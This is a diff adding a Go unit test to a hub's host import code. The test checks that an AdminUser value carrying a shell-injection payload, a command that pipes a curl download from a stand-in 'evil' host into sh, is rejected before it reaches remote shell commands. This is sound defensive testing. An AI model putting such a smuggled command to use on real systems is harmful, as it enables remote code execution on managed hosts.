@@ -159,6 +159,50 @@ func TestImportHostsPartialFailureKeepsGoing(t *testing.T) {
 	}
 }
 
+// TestImportHostsRejectsUnsafeAdminUser guards the import boundary itself:
+// AdminUser round-trips through export/import with no encryption or other
+// protection, so a hand-edited or tampered export file is untrusted input.
+// Later, whatever ends up in this column gets interpolated into a remote
+// shell command and a systemd EnvironmentFile line with no escaping
+// (internal/hub's resolveAdminCredential/resetRemoteAdminPassword/
+// renderEnv) — rejecting anything that isn't a plain identifier right here
+// means a bad row never even reaches that far.
+func TestImportHostsRejectsUnsafeAdminUser(t *testing.T) {
+	ctx := context.Background()
+	db, err := Open(filepath.Join(t.TempDir(), "hub.db"))
+	if err != nil {
+		t.Fatalf("Open: %v", err)
+	}
+	defer db.Close()
+
+	export := HubExport{
+		Version: ExportFormatVersion,
+		Hosts: []HostExport{
+			{
+				Name: "poisoned", Addr: "10.0.0.1", SSHUser: "root", SSHAuthKind: HostAuthPassword,
+				SecretEnc: []byte("s"), Status: HostStatusNew, CreatedAt: Now(),
+				AdminUser: "admin'; curl http://evil/x|sh #",
+			},
+		},
+	}
+
+	imported, errs := db.ImportHosts(ctx, export)
+	if imported != 0 {
+		t.Errorf("imported = %d, want 0 — a shell-metacharacter AdminUser must be rejected", imported)
+	}
+	if len(errs) != 1 {
+		t.Fatalf("errs = %v, want exactly one rejection", errs)
+	}
+
+	got, err := db.ListHosts(ctx)
+	if err != nil {
+		t.Fatalf("ListHosts: %v", err)
+	}
+	if len(got) != 0 {
+		t.Errorf("ListHosts = %+v, want no hosts imported", got)
+	}
+}
+
 func TestDecodeHubExportRejectsWrongVersion(t *testing.T) {
 	_, err := DecodeHubExport([]byte(`{"version": 999, "hosts": []}`))
 	if err == nil {
